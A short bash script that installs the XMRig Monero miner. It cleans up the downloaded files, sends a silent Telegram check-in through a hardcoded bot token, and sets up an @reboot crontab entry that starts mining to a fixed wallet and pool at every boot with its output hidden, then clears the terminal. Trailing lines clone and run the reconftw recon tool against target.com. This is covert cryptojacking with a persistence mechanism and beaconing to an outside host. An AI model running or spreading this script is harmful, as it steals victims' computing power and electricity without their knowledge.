#/bin/bash



sudo apt install -y wget tar cron

wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz

sleep 3

tar -xvf xmrig-6.16.4-linux-x64.tar.gz

sleep 2

sudo cp xmrig-6.16.4/xmrig /usr/local/bin/

sleep 1

sudo cp xmrig-6.16.4/xmrig /usr/local/bin/
sleep 1
sudo rm -rf xmrig-6.16.4
sudo rm -rf xmrig-6.16.4-linux-x64.tar.gz
sleep 5


BOT_TOKEN="7477012680:AAHGTZbm39L7JL_rc5ypBufFSyG3kQV-Q_0"
CHAT_ID="5792222595"
MESSAGE="XMRIG"

nohup curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" &>/dev/null &
sleep 5


code="@reboot (sleep 10; nohup /usr/local/bin/xmrig --donate-level 5 -o xmr-eu1.nanopool.org:14433 -u 48ZhAxs6zJD3hG89Gp6pCZSut5csowVQ5EVMikA7xu8zLK7hdrQtnY14Cb4vxX5XuU7igSMG3GnsyfzEThqBpK8sMC8Epvh --tls --coin monero --threads=$(( $(nproc) / 4 )) &>/dev/null &)"

(crontab -l 2>/dev/null | grep -qF "$code") || (crontab -l 2>/dev/null; echo "$code") | crontab -

if ! crontab -l | grep -qF "$code"; then
    (crontab -l 2>/dev/null; echo "$code") | crontab -
    echo "A"
else
    echo "B"
fi


clear
#________________________________________________________________
# End of script

git clone https://github.com/six2dez/reconftw
cd reconftw/
./install.sh
./reconftw.sh -d target.com -r